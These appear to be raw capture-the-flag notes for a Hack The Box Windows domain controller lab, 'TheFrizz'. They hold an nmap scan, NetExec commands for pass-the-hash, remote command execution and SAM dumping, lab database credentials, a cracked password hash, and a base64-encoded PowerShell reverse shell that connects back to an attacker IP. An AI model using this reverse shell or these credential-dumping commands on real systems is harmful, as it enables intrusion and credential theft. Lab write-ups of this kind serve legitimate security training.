sudo nmap -sC -sV -oA nmap/thefrizz 10.10.11.60

 Nmap 7.95 scan initiated Fri Sep  5 15:39:50 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -T4 -oA nmap/TheFrizz -vv 10.10.11.60
Nmap scan report for 10.10.11.60
Host is up, received echo-reply ttl 127 (0.34s latency).
Scanned at 2025-09-05 15:39:51 IST for 106s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-05 17:10:20Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21203/tcp): CLEAN (Timeout)
|   Check 2 (port 57407/tcp): CLEAN (Timeout)
|   Check 3 (port 49509/udp): CLEAN (Timeout)
|   Check 4 (port 41227/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-09-05T17:10:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

---
```
nxc smb 10.10.11.60
```

- Check host:
    

```bash
nxc smb <ip>
```

- Login with creds:
    

```bash
nxc smb <ip> -u user -p pass
```

- Pass-the-hash:
    

```bash
nxc smb <ip> -u user -H <hash>
```

- Command exec:
    

```bash
nxc smb <ip> -u user -p pass -x "whoami"
```

- List shares:
    

```bash
nxc smb <ip> -u user -p pass --shares
```

- Dump SAM:
    

```bash
nxc smb <ip> -u user -p pass --sam
```

### Outut: 
nxc smb 10.10.11.60
SMB         10.10.11.60     445    10.10.11.60      [*]  x64 (name:10.10.11.60) (domain:10.10.11.60) (signing:True) (SMBv1:False) (NTLM:False)

---

$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';




067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23


 echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d | rev 
'R!deTheM@gicBus!'


echo 'powershell -nop -w hidden -c "$ip="10.10.14.114"; $port=4444;
$client=New-Object System.Net.Sockets.TCPClient($ip,$port);
$stream=$client.GetStream();
[byte[]]$bytes=0..65535|%{0};
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback=(iex $data 2>&1 | Out-String);
    $sendback2=$sendback+'PS '+(pwd).Path+'> ';
    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
"' | iconv -t UTF-16LE | base64 -w 0
